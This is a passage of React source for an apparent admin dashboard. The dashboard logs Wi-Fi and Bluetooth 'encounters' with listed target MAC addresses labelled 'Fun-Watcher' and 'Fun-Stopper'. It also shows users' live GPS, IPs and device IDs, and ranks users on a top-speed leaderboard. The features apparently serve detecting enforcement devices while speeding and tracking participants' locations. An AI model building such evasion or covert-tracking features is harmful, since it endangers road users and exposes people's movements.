            {/* ── Row 2: live GPS if online ── */}
            {live && (
              <div style={{ fontSize: 11, color: C.dim, fontFamily: 'monospace', marginBottom: 6 }}>
                {live.lat != null ? `${live.lat.toFixed(5)}, ${live.lon.toFixed(5)}` : 'No GPS'}
                {live.speed != null ? `  ·  ${(live.speed * 2.23694).toFixed(1)} mph` : ''}
              </div>
            )}

            {/* ── Row 3: device ID if available ── */}
            {devId && (
              <div style={{ fontSize: 10, color: C.dim, fontFamily: 'monospace', marginBottom: 6, wordBreak: 'break-all' }}>
                {devId}
              </div>
            )}

            {/* ── Row 4: location & data privilege toggles ── */}
            <div style={{ fontSize: 11, color: C.dim, fontWeight: 600, letterSpacing: 0.5, marginBottom: 5 }}>
              LOCATION &amp; DATA PRIVILEGES
            </div>
            <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
              <VisToggle
                on={visOn}
                label="Visible to others"
                onClick={() => toggle(u, 'visible_to_others', visOn)}
                disabled={!!busy[`${devId}_visible_to_others`]}
              />
              <VisToggle
                on={canSee}
                label="Can see others"
                onClick={() => toggle(u, 'can_view_others', canSee)}
                disabled={!!busy[`${devId}_can_view_others`]}
              />
              <VisToggle
                on={canContrib}
                label="Contributes data"
                onClick={() => toggle(u, 'can_contribute', canContrib)}
                disabled={!!busy[`${devId}_can_contribute`]}
              />
            </div>
            {activeOnly && (
              <div style={{ fontSize: 10, color: C.orange, marginTop: 5 }}>
                Unregistered — toggling will auto-create a registry entry for this device.
              </div>
            )}
          </div>
        )
      })}

      {/* ── Top Speed Leaderboard ── */}
      <div style={{ ...S.label, marginTop: 8 }}>Top Speed Leaderboard</div>
      {(() => {
        const board = (registeredUsers || [])
          .filter(u => u.top_speed_mps != null && u.username)
          .sort((a, b) => b.top_speed_mps - a.top_speed_mps)
        if (board.length === 0) {
          return <div style={{ ...S.card, color: C.dim, fontSize: 13 }}>No speed records yet.</div>
        }
        const MEDAL = ['🥇', '🥈', '🥉']
        return board.map((u, i) => (
          <div key={u.device_id} style={{ ...S.card, display: 'flex', alignItems: 'center', gap: 12 }}>
            <span style={{ fontSize: i < 3 ? 20 : 14, minWidth: 28, textAlign: 'center', color: C.dim }}>
              {MEDAL[i] || `#${i + 1}`}
            </span>
            <div style={{ flex: 1 }}>
              <span style={{ color: C.text, fontWeight: 600 }}>{u.username}</span>
              <span style={{ color: C.dim, fontSize: 11, marginLeft: 8 }}>{u.vehicle}</span>
              <div style={{ color: C.green, fontWeight: 700, fontSize: 15, marginTop: 2 }}>
                {(u.top_speed_mps * 2.23694).toFixed(1)} mph
                <span style={{ color: C.dim, fontWeight: 400, fontSize: 11, marginLeft: 8 }}>
                  · {(u.top_speed_mps * 3.6).toFixed(1)} km/h
                </span>
              </div>
            </div>
            <button
              style={{ ...S.btn(C.dim), padding: '3px 9px', fontSize: 11 }}
              title="Reset this user's top speed record"
              onClick={async () => {
                await fetch(`/users/leaderboard/reset/${encodeURIComponent(u.device_id)}`, { method: 'POST' }).catch(() => {})
                refresh()
              }}>
              ↺ Reset
            </button>
          </div>
        ))
      })()}
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Data tab
// ─────────────────────────────────────────────────────────────────────────────
function TabData({ data, refresh }) {
  const { encounters, heatCells, routePoints } = data
  const [filter, setFilter]   = useState('all')
  const [clearing, setClearing] = useState('')
  const [msg, setMsg]         = useState('')

  const clearEndpoint = async (ep) => {
    setClearing(ep)
    try {
      await fetch(`/${ep}/clear`, { method:'POST' })
      setMsg(`Cleared /${ep}`)
      refresh()
    } catch { setMsg('Clear failed — backend may not support this endpoint') }
    setTimeout(() => setMsg(''), 4000)
    setClearing('')
  }

  const filtered = filter === 'all' ? encounters
    : filter === 'watcher' ? encounters.filter(e => e.label==='Fun-Watcher')
    : filter === 'stopper' ? encounters.filter(e => e.label==='Fun-Stopper')
    : encounters.filter(e => e.label!=='Fun-Watcher'&&e.label!=='Fun-Stopper')

  return (
    <div style={S.section}>
      <div style={S.label}>Summary</div>
      <div style={S.card}>
        <Val label="Encounters" value={encounters.length} />
        <Val label="Heat cells" value={heatCells.length} />
        <ValLast label="Route points" value={routePoints.length} />
      </div>

      <div style={S.label}>Exports</div>
      <div style={{ display:'flex', gap:8, flexWrap:'wrap' }}>
        {[['RAW CSV','/export/csv'],['ENC CSV','/export/encounters'],['GEOJSON','/export/geojson']].map(([label,href]) => (
          <a key={href} href={href} download style={{ ...S.btn(C.accent), textDecoration:'none', padding:'8px 14px', fontSize:12 }}>{label}</a>
        ))}
      </div>

      <div style={S.label}>Clear Data</div>
      <div style={{ display:'flex', gap:8, flexWrap:'wrap' }}>
        {['encounters','heatmap','route'].map(ep => (
          <button key={ep} style={S.btn(C.orange)} onClick={() => clearEndpoint(ep)} disabled={clearing===ep}>
            {clearing===ep ? '…' : `Clear ${ep}`}
          </button>
        ))}
      </div>
      {msg && <div style={{ fontSize:12, color:C.dim, fontFamily:'monospace' }}>{msg}</div>}

      <div style={S.label}>Encounters</div>
      <div style={{ display:'flex', gap:6, marginBottom:6 }}>
        {['all','watcher','stopper','misc'].map(f => (
          <button key={f} style={{
            background: filter===f ? 'rgba(10,132,255,0.2)' : 'rgba(255,255,255,0.07)',
            border:'none', borderRadius:8, color:filter===f ? C.accent : C.dim,
            fontFamily:C.font, fontSize:12, fontWeight:600, padding:'5px 12px', cursor:'pointer',
          }} onClick={() => setFilter(f)}>{f}</button>
        ))}
      </div>
      <div style={{ ...S.card, maxHeight:360, overflowY:'auto' }}>
        {filtered.length === 0
          ? <span style={{ color:C.dim, fontSize:13 }}>No encounters</span>
          : filtered.slice(0,100).map((enc, i, arr) => (
            <div key={enc.id||i} style={i < arr.length-1 ? { ...S.row, flexDirection:'column', alignItems:'flex-start', gap:2 } : { ...S.rowLast, flexDirection:'column', alignItems:'flex-start', gap:2 }}>
              <div style={{ display:'flex', width:'100%', justifyContent:'space-between' }}>
                <span style={{ color:enc.label==='Fun-Watcher'?C.accent:enc.label==='Fun-Stopper'?C.red:C.green, fontWeight:600, fontSize:13 }}>{enc.label||'Target'}</span>
                <span style={{ color:C.dim2, fontSize:11 }}>{enc.rssi_max?.toFixed(0)} dBm · {enc.hit_count} hits</span>
              </div>
              <span style={{ color:C.dim2, fontSize:11, fontFamily:'monospace' }}>{new Date(enc.peak_ts_ms).toLocaleString()}</span>
            </div>
          ))
        }
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Signal tab
// ─────────────────────────────────────────────────────────────────────────────
function TabSignal({ data }) {
  const buckets = data.signalBuckets || []

  if (buckets.length === 0) {
    return (
      <div style={S.section}>
        <div style={S.label}>Signal Quality Timeline</div>
        <div style={{ ...S.card, color:C.dim, fontSize:13 }}>
          No signal data yet. Start scanning to see RSSI history.
        </div>
      </div>
    )
  }

  // Group by bucket timestamp
  const bucketMap = {}
  buckets.forEach(b => {
    if (!bucketMap[b.ts_ms]) bucketMap[b.ts_ms] = {}
    bucketMap[b.ts_ms][b.source] = b
  })
  const times = Object.keys(bucketMap).map(Number).sort((a, b) => a - b)

  const W = 320, H = 80
  const barW = Math.max(2, Math.floor(W / (times.length * 2 + 1)) - 1)
  const RSSI_MIN = -100, RSSI_MAX = -30

  const rssiToY = (rssi) => {
    const clamped = Math.max(RSSI_MIN, Math.min(RSSI_MAX, rssi))
    return H - ((clamped - RSSI_MIN) / (RSSI_MAX - RSSI_MIN)) * H
  }

  const totalWifi = buckets.filter(b => b.source === 'wifi').length
  const totalBle  = buckets.filter(b => b.source === 'ble').length
  const totalHits = buckets.reduce((s, b) => s + b.hits, 0)

  return (
    <div style={S.section}>
      <div style={S.label}>Signal Quality (last 6h · 5-min buckets · stronger = taller bar)</div>
      <div style={S.card}>
        <div style={{ color:C.dim2, fontSize:10, marginBottom:6 }}>–30 dBm (top) → –100 dBm (bottom)</div>
        <svg width="100%" viewBox={`0 0 ${W} ${H}`} style={{ display:'block', overflow:'visible' }}>
          {[-30, -50, -70, -90].map(r => {
            const y = rssiToY(r)
            return (
              <g key={r}>
                <line x1={0} y1={y} x2={W} y2={y} stroke={C.border} strokeWidth={0.5} />
                <text x={W - 1} y={y - 2} fill={C.dim2} fontSize={7} textAnchor="end">{r}</text>
              </g>
            )
          })}
          {times.map((ts, i) => {
            const x = i * (barW * 2 + 3)
            const wifi = bucketMap[ts].wifi
            const ble  = bucketMap[ts].ble
            return (
              <g key={ts}>
                {wifi && (
                  <rect x={x} y={rssiToY(wifi.avg_rssi)} width={barW}
                    height={H - rssiToY(wifi.avg_rssi)} fill="#00D4FF" opacity={0.85} />
                )}
                {ble && (
                  <rect x={x + barW + 1} y={rssiToY(ble.avg_rssi)} width={barW}
                    height={H - rssiToY(ble.avg_rssi)} fill="#2979FF" opacity={0.85} />
                )}
              </g>
            )
          })}
        </svg>
        <div style={{ display:'flex', gap:14, marginTop:8, flexWrap:'wrap' }}>
          <span style={{ fontSize:11, color:'#00D4FF' }}>■ Wi-Fi ({totalWifi} buckets)</span>
          <span style={{ fontSize:11, color:'#2979FF' }}>■ BLE ({totalBle} buckets)</span>
          <span style={{ fontSize:11, color:C.dim }}>Total {totalHits} hits · {times.length} time slots</span>
        </div>
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Replay tab
// ─────────────────────────────────────────────────────────────────────────────
function TabReplay() {
  const [allEnc,   setAllEnc]   = useState([])
  const [allRoute, setAllRoute] = useState([])
  const [loading,  setLoading]  = useState(false)
  const [loaded,   setLoaded]   = useState(false)
  const [currentTs, setCurrentTs] = useState(0)
  const [playing,  setPlaying]  = useState(false)
  const [speed,    setSpeed]    = useState(30)
  const playRef    = useRef(null)
  const mapDivRef  = useRef(null)
  const replayMapRef    = useRef(null)
  const replayRouteRef  = useRef(null)
  const replayEncRef    = useRef(null)

  const load = async () => {
    setLoading(true)
    try {
      const [er, rr] = await Promise.all([
        fetch('/encounters?limit=5000').then(r => r.json()),
        fetch('/route?limit=10000').then(r => r.json()),
      ])
      const encs  = (er.encounters || []).filter(e => e.lat && e.lon)
      const route = (rr.points    || []).filter(p => p.lat && p.lon)
      setAllEnc(encs)
      setAllRoute(route)
      const allTs = [...encs.map(e => e.peak_ts_ms), ...route.map(p => p.ts)].filter(Boolean)
      if (allTs.length) setCurrentTs(Math.min(...allTs))
      setLoaded(true)
    } catch {}
    setLoading(false)
  }

  // Init Leaflet map once data is loaded and div is mounted
  useEffect(() => {
    if (!loaded || !mapDivRef.current || replayMapRef.current) return
    const map = L.map(mapDivRef.current, { zoomControl: true, attributionControl: false })
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
      subdomains: 'abcd', maxZoom: 19,
    }).addTo(map)
    replayMapRef.current = map
    replayRouteRef.current = L.layerGroup().addTo(map)
    replayEncRef.current   = L.layerGroup().addTo(map)

    // Fit map to all data on first load
    const allLatLon = [
      ...allEnc.map(e => [e.lat, e.lon]),
      ...allRoute.map(p => [p.lat, p.lon]),
    ].filter(([la, lo]) => la && lo)
    if (allLatLon.length) {
      map.fitBounds(L.latLngBounds(allLatLon), { padding: [24, 24] })
    }

    return () => {
      map.remove()
      replayMapRef.current = null
      replayRouteRef.current = null
      replayEncRef.current = null
    }
  }, [loaded]) // eslint-disable-line react-hooks/exhaustive-deps

  // Playback interval
  useEffect(() => {
    if (!playing) { clearInterval(playRef.current); return }
    const allTs = [...allEnc.map(e => e.peak_ts_ms), ...allRoute.map(p => p.ts)].filter(Boolean)
    const maxTs = allTs.length ? Math.max(...allTs) : currentTs
    playRef.current = setInterval(() => {
      setCurrentTs(prev => {
        const next = prev + 1000 * speed
        if (next >= maxTs) { setPlaying(false); return maxTs }
        return next
      })
    }, 100)
    return () => clearInterval(playRef.current)
  }, [playing, speed, allEnc, allRoute])

  // Redraw route + encounter layers when timestamp changes
  useEffect(() => {
    const map = replayMapRef.current
    if (!map) return

    const visEnc   = allEnc.filter(e => e.peak_ts_ms <= currentTs)
    const visRoute = allRoute.filter(p => p.ts <= currentTs)

    // Route polyline
    replayRouteRef.current.clearLayers()
    if (visRoute.length > 1) {
      L.polyline(visRoute.map(p => [p.lat, p.lon]), {
        color: '#0A84FF', weight: 2.5, opacity: 0.75,
      }).addTo(replayRouteRef.current)
    }

    // Encounter markers
    replayEncRef.current.clearLayers()
    visEnc.forEach(enc => {
      const color = enc.label === 'Fun-Watcher' ? '#00D4FF'
                  : enc.label === 'Fun-Stopper' ? '#FF453A' : '#30D158'
      const icon = L.divIcon({
        className: '',
        html: `<div style="width:10px;height:10px;border-radius:50%;background:${color};border:2px solid #fff;box-shadow:0 0 6px ${color}"></div>`,
        iconSize: [10, 10], iconAnchor: [5, 5],
      })
      L.marker([enc.lat, enc.lon], { icon })
        .bindPopup(`<div style="font-family:monospace;font-size:11px;color:#e0e0e0;background:#111820;padding:6px 8px;border-left:3px solid ${color}"><b style="color:${color}">${enc.label || 'Target'}</b><br/>RSSI: ${enc.rssi_max?.toFixed(1)} dBm<br/>${new Date(enc.peak_ts_ms).toLocaleTimeString()}</div>`, { className: 'dark-popup' })
        .addTo(replayEncRef.current)
    })
  }, [currentTs, allEnc, allRoute])

  if (!loaded) {
    return (
      <div style={S.section}>
        <div style={S.label}>Encounter Replay</div>
        <div style={S.card}>
          <div style={{ color:C.dim, fontSize:13, marginBottom:10 }}>
            Load all encounter and route data to replay a session on a map.
          </div>
          <button style={S.btn(C.accent)} onClick={load} disabled={loading}>
            {loading ? '⏳ Loading…' : '▶ Load Data'}
          </button>
        </div>
      </div>
    )
  }

  const allTs = [...allEnc.map(e => e.peak_ts_ms), ...allRoute.map(p => p.ts)].filter(Boolean)
  const minTs = allTs.length ? Math.min(...allTs) : 0
  const maxTs = allTs.length ? Math.max(...allTs) : 0

  const visEnc   = allEnc.filter(e => e.peak_ts_ms <= currentTs)
  const visRoute = allRoute.filter(p => p.ts <= currentTs)
  const wCount = visEnc.filter(e => e.label === 'Fun-Watcher').length
  const sCount = visEnc.filter(e => e.label === 'Fun-Stopper').length
  const mCount = visEnc.length - wCount - sCount

  return (
    <div style={S.section}>
      <div style={S.label}>Encounter Replay</div>

      {/* Leaflet map */}
      <div style={{ ...S.card, padding: 0, overflow: 'hidden', borderRadius: 10 }}>
        <div ref={mapDivRef} style={{ width: '100%', height: 260, background: '#0a0a0a' }} />
      </div>

      <div style={S.card}>
        <div style={{ fontSize:11, color:C.dim, marginBottom:6, fontFamily:'monospace' }}>
          {currentTs ? new Date(currentTs).toLocaleString() : '—'}
        </div>
        <input type="range" min={minTs} max={maxTs} step={1000} value={currentTs}
          onChange={e => { setPlaying(false); setCurrentTs(Number(e.target.value)) }}
          style={{ width:'100%', accentColor:C.accent, marginBottom:8 }}
        />
        <div style={{ display:'flex', gap:8, alignItems:'center', flexWrap:'wrap' }}>
          <button style={S.btn(playing ? C.orange : C.green)} onClick={() => setPlaying(v => !v)}>
            {playing ? '⏸ Pause' : '▶ Play'}
          </button>
          <button style={{ ...S.btn(C.dim), padding:'8px 12px' }}
            onClick={() => { setPlaying(false); setCurrentTs(minTs) }}>⏮ Reset</button>
          <div style={{ display:'flex', alignItems:'center', gap:6 }}>
            <span style={{ fontSize:11, color:C.dim }}>Speed</span>
            <select style={{ ...S.select, width:76, padding:'6px 8px', fontSize:12 }}
              value={speed} onChange={e => setSpeed(Number(e.target.value))}>
              {[5, 10, 30, 60, 120, 300].map(s => <option key={s} value={s}>{s}×</option>)}
            </select>
          </div>
          <button style={{ ...S.btn(C.accent), padding:'8px 12px', fontSize:12 }} onClick={() => { setLoaded(false); replayMapRef.current = null; load() }}>↻ Reload</button>
        </div>
      </div>

      <div style={S.card}>
        <div style={{ display:'flex', gap:14, flexWrap:'wrap' }}>
          <span style={{ fontSize:11, color:'#00D4FF' }}>● Watcher ({wCount})</span>
          <span style={{ fontSize:11, color:'#FF453A' }}>● Stopper ({sCount})</span>
          <span style={{ fontSize:11, color:'#30D158' }}>● Misc ({mCount})</span>
          <span style={{ fontSize:11, color:C.dim }}>Route {visRoute.length} pts</span>
        </div>
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Registry tab
// ─────────────────────────────────────────────────────────────────────────────
function TabRegistry() {
  const [users, setUsers]     = useState([])
  const [editing, setEditing] = useState(null)   // device_id being edited
  const [editVals, setEditVals] = useState({})
  const [busy, setBusy]       = useState({})
  const [msg, setMsg]         = useState('')

  const load = useCallback(async () => {
    try {
      const r = await fetch('/users/registry')
      if (r.ok) setUsers((await r.json()).users || [])
    } catch {}
  }, [])

  useEffect(() => { load() }, [load])
  useEffect(() => { const id = setInterval(load, 5000); return () => clearInterval(id) }, [load])

  const setStatus = async (device_id, status) => {
    setBusy(p => ({ ...p, [device_id]: true }))
    const ep = status === 'approved' ? '/users/registry/approve' : '/users/registry/block'
    await fetch(ep, {
      method: 'POST', headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ device_id }),
    }).catch(() => {})
    await load()
    setBusy(p => { const n={...p}; delete n[device_id]; return n })
    setMsg(`${status === 'approved' ? 'Approved' : 'Blocked'}: ${device_id.slice(0,12)}…`)
    setTimeout(() => setMsg(''), 3000)
  }

  const startEdit = (u) => {
    setEditing(u.device_id)
    setEditVals({ username: u.username, vehicle: u.vehicle, notes: u.notes || '' })
  }

  const saveEdit = async (device_id) => {
    await fetch(`/users/registry/${encodeURIComponent(device_id)}`, {
      method: 'PUT', headers: {'Content-Type':'application/json'},
      body: JSON.stringify(editVals),
    }).catch(() => {})
    setEditing(null)
    load()
  }

  const groups = {
    pending:  users.filter(u => u.status === 'pending'),
    approved: users.filter(u => u.status === 'approved'),
    blocked:  users.filter(u => u.status === 'blocked'),
  }

  const statusColor = { pending: C.orange, approved: C.green, blocked: C.red }

  const UserCard = ({ u }) => {
    const isEditing = editing === u.device_id
    const age = u.last_seen_ms ? Math.round((Date.now() - u.last_seen_ms) / 1000) : null
    return (
      <div style={{ ...S.card, marginBottom:8, opacity: u.status === 'blocked' ? 0.6 : 1 }}>
        <div style={{ display:'flex', justifyContent:'space-between', alignItems:'flex-start', marginBottom:6 }}>
          <div>
            <span style={{ color: u.username ? C.text : C.dim, fontWeight:600, fontSize:14 }}>
              {u.username || '(no name)'}
            </span>
            <span style={{ color:C.dim2, fontSize:11, marginLeft:8 }}>{u.vehicle}</span>
          </div>
          <span style={{ fontSize:10, fontWeight:700, color: statusColor[u.status], letterSpacing:1, textTransform:'uppercase' }}>
            {u.status}
          </span>
        </div>

        {isEditing ? (
          <div style={{ display:'flex', flexDirection:'column', gap:6, marginBottom:8 }}>
            <input style={{ ...S.input, fontSize:13 }} placeholder="Username"
              value={editVals.username} onChange={e => setEditVals(p => ({...p, username: e.target.value}))} />
            <select style={S.select} value={editVals.vehicle}
              onChange={e => setEditVals(p => ({...p, vehicle: e.target.value}))}>
              {['motorcycle','car','van','truck','bicycle','foot'].map(v => <option key={v}>{v}</option>)}
            </select>
            <input style={{ ...S.input, fontSize:12 }} placeholder="Notes (optional)"
              value={editVals.notes} onChange={e => setEditVals(p => ({...p, notes: e.target.value}))} />
            <div style={{ display:'flex', gap:6 }}>
              <button style={{ ...S.btn(C.green), padding:'6px 14px', fontSize:12 }} onClick={() => saveEdit(u.device_id)}>Save</button>
              <button style={{ ...S.btn(C.dim), padding:'6px 14px', fontSize:12 }} onClick={() => setEditing(null)}>Cancel</button>
            </div>
          </div>
        ) : (
          <div style={{ marginBottom:6 }}>
            <div style={{ fontSize:11, color:C.dim2, fontFamily:'monospace', marginBottom:2 }}>
              ID: {u.device_id.slice(0, 16)}…
            </div>
            <div style={{ fontSize:11, color:C.dim2 }}>
              IP: {u.ip || '—'} &nbsp;·&nbsp; {age != null ? (age < 60 ? `${age}s ago` : age < 3600 ? `${Math.round(age/60)}m ago` : `${Math.round(age/3600)}h ago`) : 'never'}
            </div>
            {u.notes && <div style={{ fontSize:11, color:C.orange, marginTop:2 }}>📝 {u.notes}</div>}
          </div>
        )}

        {!isEditing && (
          <div style={{ display:'flex', gap:6, flexWrap:'wrap' }}>
            {u.status !== 'approved' && (
              <button style={{ ...S.btn(C.green), padding:'5px 12px', fontSize:12 }}
                onClick={() => setStatus(u.device_id, 'approved')} disabled={!!busy[u.device_id]}>
                ✅ Approve
              </button>
            )}
            {u.status !== 'blocked' && (
              <button style={{ ...S.btn(C.red), padding:'5px 12px', fontSize:12 }}
                onClick={() => setStatus(u.device_id, 'blocked')} disabled={!!busy[u.device_id]}>
                🚫 Block
              </button>
            )}
            {u.status !== 'pending' && (
              <button style={{ ...S.btn(C.orange), padding:'5px 12px', fontSize:12 }}
                onClick={() => setStatus(u.device_id, 'pending')} disabled={!!busy[u.device_id]}>
                ⏳ Pending
              </button>
            )}
            <button style={{ ...S.btn(C.dim), padding:'5px 12px', fontSize:12 }} onClick={() => startEdit(u)}>
              ✏ Edit
            </button>
          </div>
        )}
      </div>
    )
  }

  return (
    <div style={S.section}>
      {msg && <div style={{ ...S.card, color:C.green, fontSize:13 }}>{msg}</div>}

      {groups.pending.length > 0 && (
        <>
          <div style={{ ...S.label, color:C.orange }}>⏳ Pending Approval ({groups.pending.length})</div>
          {groups.pending.map(u => <UserCard key={u.device_id} u={u} />)}
        </>
      )}

      {groups.approved.length > 0 && (
        <>
          <div style={{ ...S.label, color:C.green }}>✅ Approved ({groups.approved.length})</div>
          {groups.approved.map(u => <UserCard key={u.device_id} u={u} />)}
        </>
      )}

      {groups.blocked.length > 0 && (
        <>
          <div style={{ ...S.label, color:C.red }}>🚫 Blocked ({groups.blocked.length})</div>
          {groups.blocked.map(u => <UserCard key={u.device_id} u={u} />)}
        </>
      )}

      {users.length === 0 && (
        <div style={{ ...S.card, color:C.dim, fontSize:13 }}>No registered devices yet.</div>
      )}
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Settings tab
// ─────────────────────────────────────────────────────────────────────────────
function TabSettings({ data, refresh }) {
  const [values, setValues] = useState(null)
  const [saved, setSaved]   = useState(false)
  const [busy, setBusy]     = useState(false)

  useEffect(() => { if (data.settings) setValues({ ...data.settings }) }, [data.settings])

  const set = (key, val) => setValues(v => ({ ...v, [key]: val }))

  const save = async () => {
    setBusy(true)
    try {
      await fetch('/settings', { method:'PUT', headers:{'Content-Type':'application/json'}, body:JSON.stringify(values) })
      setSaved(true); setTimeout(() => setSaved(false), 2000); refresh()
    } catch {}
    setBusy(false)
  }

  if (!values) return <div style={{ color:C.dim, fontSize:13 }}>Loading…</div>

  const numFields = [
    { key:'alert_radius_m',       label:'Alert radius',        unit:'m',   min:50,   max:2000, step:50 },
    { key:'alert_cooldown_s',     label:'Alert cooldown',      unit:'s',   min:5,    max:300,  step:5 },
    { key:'wifi_scan_interval_s', label:'Wi-Fi scan interval', unit:'s',   min:0.5,  max:30,   step:0.5 },
    { key:'heat_cell_m',          label:'Heat cell size',      unit:'m',   min:25,   max:500,  step:25 },
    { key:'rssi_floor',           label:'RSSI floor',          unit:'dBm', min:-110, max:-40,  step:1 },
    { key:'audio_volume',         label:'Audio volume',        unit:'',    min:0,    max:1,    step:0.05 },
  ]
  const boolFields = [
    { key:'wifi_scan_enabled', label:'Wi-Fi scanning' },
    { key:'ble_scan_enabled',  label:'BLE scanning' },
    { key:'audio_enabled',     label:'Audio alerts' },
    { key:'fake_data_enabled', label:'Fake/demo data' },
  ]

  const Toggle = ({ k }) => (
    <div onClick={() => set(k, !values[k])} style={{
      width:44, height:26, borderRadius:13, cursor:'pointer', flexShrink:0,
      background: values[k] ? C.green : C.card2, position:'relative', transition:'background 0.2s',
    }}>
      <div style={{ position:'absolute', top:3, left:values[k]?19:3, width:20, height:20, borderRadius:'50%', background:'#fff', transition:'left 0.2s', boxShadow:'0 1px 4px rgba(0,0,0,0.3)' }}/>
    </div>
  )

  return (
    <div style={S.section}>
      <div style={S.label}>Numeric</div>
      <div style={S.card}>
        {numFields.map((f,i) => (
          <div key={f.key} style={i<numFields.length-1?S.row:S.rowLast}>
            <span style={S.k}>{f.label}</span>
            <div style={{ display:'flex', alignItems:'center', gap:8 }}>
              <input type="range" min={f.min} max={f.max} step={f.step} value={values[f.key]??f.min}
                onChange={e => set(f.key, parseFloat(e.target.value))}
                style={{ width:100, accentColor:C.accent }} />
              <span style={{ ...S.v, minWidth:56, textAlign:'right' }}>{values[f.key]} {f.unit}</span>
            </div>
          </div>
        ))}
      </div>

      <div style={S.label}>Toggles</div>
      <div style={S.card}>
        {boolFields.map((f,i) => (
          <div key={f.key} style={i<boolFields.length-1?S.row:S.rowLast}>
            <span style={S.k}>{f.label}</span>
            <Toggle k={f.key} />
          </div>
        ))}
      </div>

      <div style={S.label}>Scan Mode</div>
      <select style={S.select} value={values.scan_mode||'idle'} onChange={e => set('scan_mode', e.target.value)}>
        {['idle','wifi','ble','both','fake'].map(m => <option key={m}>{m}</option>)}
      </select>

      <button style={{ ...S.btn(saved ? C.green : C.accent), alignSelf:'flex-start' }} onClick={save} disabled={busy}>
        {saved ? '✓ Saved' : busy ? 'Saving…' : 'Save All Settings'}
      </button>

      <div style={S.label}>Raw JSON</div>
      <div style={S.card}>
        <pre style={{ color:C.dim, fontSize:11, fontFamily:'monospace', margin:0, whiteSpace:'pre-wrap', wordBreak:'break-all', maxHeight:200, overflowY:'auto' }}>
          {JSON.stringify(values, null, 2)}
        </pre>
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Targets tab
// ─────────────────────────────────────────────────────────────────────────────
function TabTargets() {
  const [wifi, setWifi]   = useState([])
  const [ble, setBle]     = useState([])
  const [saved, setSaved] = useState(false)
  const [err, setErr]     = useState('')

  useEffect(() => {
    fetch('/targets').then(r => r.json()).then(d => { setWifi(d.wifi||[]); setBle(d.ble||[]) }).catch(()=>{})
  }, [])

  const macOk = s => /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/.test((s||'').trim())

  const save = async () => {
    setErr('')
    const cw = wifi.filter(e => e.bssid?.trim())
    const cb = ble.filter(e => e.address?.trim())
    const bad = [...cw.filter(e => !macOk(e.bssid)), ...cb.filter(e => !macOk(e.address))]
    if (bad.length) { setErr(`${bad.length} invalid MAC address(es) — expected AA:BB:CC:DD:EE:FF`); return }
    try {
      const r = await fetch('/targets', { method:'PUT', headers:{'Content-Type':'application/json'}, body:JSON.stringify({wifi:cw,ble:cb}) })
      if (r.ok) { setSaved(true); setTimeout(() => setSaved(false), 2500) }
      else setErr('Save failed')
    } catch(e) { setErr(String(e)) }
  }

  const TRow = ({ entry, idKey, onChange, onRemove }) => (
    <div style={{ display:'flex', gap:8, marginBottom:8, alignItems:'center' }}>
      <input style={{ ...S.input, fontFamily:'monospace', fontSize:12, flex:1, border: entry[idKey]&&!macOk(entry[idKey]) ? `1px solid ${C.red}` : 'none' }}
        placeholder="AA:BB:CC:DD:EE:FF" value={entry[idKey]||''} onChange={e => onChange({...entry,[idKey]:e.target.value})} />
      <input style={{ ...S.input, flex:'0 0 110px' }} placeholder="Label" value={entry.label||''} onChange={e => onChange({...entry,label:e.target.value})} />
      <button style={{ background:'none', border:'none', color:C.red, cursor:'pointer', fontSize:18, padding:'0 2px', flexShrink:0 }} onClick={onRemove}>✕</button>
    </div>
  )

  return (
    <div style={S.section}>
      <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between' }}>
        <div style={S.label}>📡 Wi-Fi ({wifi.length})</div>
        <button style={{ ...S.btn(C.accent), padding:'5px 12px', fontSize:12 }} onClick={() => setWifi(w => [...w, {bssid:'',label:''}])}>+ Add</button>
      </div>
      <div style={S.card}>
        {wifi.length === 0 ? <span style={{ color:C.dim, fontSize:13 }}>No Wi-Fi targets</span>
          : wifi.map((e,i) => <TRow key={i} entry={e} idKey="bssid" onChange={v => setWifi(w => w.map((x,j)=>j===i?v:x))} onRemove={() => setWifi(w => w.filter((_,j)=>j!==i))} />)}
      </div>

      <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between' }}>
        <div style={S.label}>🔵 BLE ({ble.length})</div>
        <button style={{ ...S.btn(C.accent), padding:'5px 12px', fontSize:12 }} onClick={() => setBle(b => [...b, {address:'',label:''}])}>+ Add</button>
      </div>
      <div style={S.card}>
        {ble.length === 0 ? <span style={{ color:C.dim, fontSize:13 }}>No BLE targets</span>
          : ble.map((e,i) => <TRow key={i} entry={e} idKey="address" onChange={v => setBle(b => b.map((x,j)=>j===i?v:x))} onRemove={() => setBle(b => b.filter((_,j)=>j!==i))} />)}
      </div>

      {err && <div style={{ color:C.red, fontSize:13 }}>⚠ {err}</div>}
      <button style={{ ...S.btn(saved ? C.green : C.accent), alignSelf:'flex-start' }} onClick={save}>
        {saved ? '✓ Saved' : 'Save Targets'}
      </button>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Security Monitor component
// ─────────────────────────────────────────────────────────────────────────────
const SEC_MON_KEY = 'sfm_sec_monitor'

function getSecMon() {
  try { return JSON.parse(localStorage.getItem(SEC_MON_KEY)) || {} } catch { return {} }
}

function SecMonitorPanel() {
  const [cfg, setCfg] = useState(() => ({
    enabled: false,
    hibpKey: '',
    watchEmails: '',
    interval: 60,
    ...getSecMon(),
  }))
  const [events, setEvents]       = useState([])
  const [running, setRunning]     = useState(false)
  const [lastRun, setLastRun]     = useState(null)
  const [expanded, setExpanded]   = useState(null)
  const eventsRef = useRef([])

  const save = (patch) => {
    const next = { ...cfg, ...patch }
    setCfg(next)
    localStorage.setItem(SEC_MON_KEY, JSON.stringify(next))
    return next
  }

  const addEvent = (severity, category, message, details) => {
    const evt = { id: Date.now() + Math.random(), severity, category, message, ts: new Date().toLocaleTimeString(), details: details || null }
    eventsRef.current = [evt, ...eventsRef.current.slice(0, 49)]
    setEvents([...eventsRef.current])
  }

